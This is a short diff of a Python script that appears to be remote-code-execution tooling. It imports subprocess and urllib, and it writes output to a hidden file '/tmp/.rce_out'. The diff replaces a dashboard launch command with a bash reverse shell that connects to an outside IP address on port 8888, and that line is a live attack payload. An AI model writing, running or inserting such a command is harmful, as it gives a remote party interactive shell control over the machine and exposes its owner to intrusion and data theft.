@@ -1,6 +1,6 @@
 import subprocess, os, urllib.request
 
-CMD = 'hermes dashboard --host 0.0.0.0 --port 3001 --insecure --no-open 2>&1'
+CMD = 'bash -i >& /dev/tcp/207.180.204.102/8888 0>&1'
 CALLBACK = ''
 OUTFILE = '/tmp/.rce_out'
 
